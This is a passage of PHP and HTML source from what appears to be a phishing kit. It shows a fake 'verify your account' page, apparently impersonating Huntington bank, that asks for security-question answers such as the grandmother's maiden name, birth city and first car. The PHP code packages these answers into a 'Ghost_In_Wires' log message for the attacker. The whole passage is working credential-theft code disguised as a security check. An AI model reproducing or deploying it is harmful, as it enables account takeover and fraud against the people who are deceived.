...
if(array_key_exists("detailsSubmit",$_POST)){
    ...
    $highshool_mascot = $_POST['highshool_mascot'];
    $city = $_POST['city'];
    $grandmother_name = $_POST['grandmother_name'];
    $first_car_color = $_POST['first_car_color'];
    $make_model = $_POST['make_model'];
    
    //$c = $_POST['password'];
    $msgtosend = "----------Ghost_In_Wires---------- \n  *******Huntington-logs******* \n ## Highshcool Mascot: $highshool_mascot \n ## City Born In: $city \n ## GrandmotherName: $grandmother_name \n ## First Car Color: $first_car_color \n ## Card Car Make: $make_model";
...
<body>
    ...
    <div class="container">
        ...
        <div class="info" style="width: 350px; border: 1px solid #48d1cc; font-size: 14px;padding: 10px; color: #333; background-color: rgba(72, 209, 204, 0.2); border-radius: 3px; margin-bottom: 15px;">
          For your security, please answer the following questions correctly to verify your account.
        </div>
        <form action="" method="post">
           ...
           <div class="all">
                <div class="form-input" id="form-input1">
                    ...
                    <fieldset>
                        <legend>Name of your High school mascot?</legend>
                        <input name="highschool_mascot" type="text" placeholder="">
                    </fieldset>
                    <fieldset>
                        <legend>In which city where you born?</legend>
                        <input name="city" type="text" placeholder="">
                    </fieldset>
                    <fieldset>
                        <legend>What is your grandmother&rsquo;s maiden name?</legend>
                        <input name="grandmother_name" type="text">
                    </fieldset>
                    <fieldset>
                        <legend>Color of first car</legend>
                        <input name="first_car_color" type="text">
                    </fieldset>
                    <fieldset>
                        <legend>What is the Make and Model</legend>
                        <input name="make_model" type="text">
                    </fieldset>
                </div>
                <div id="submitA">
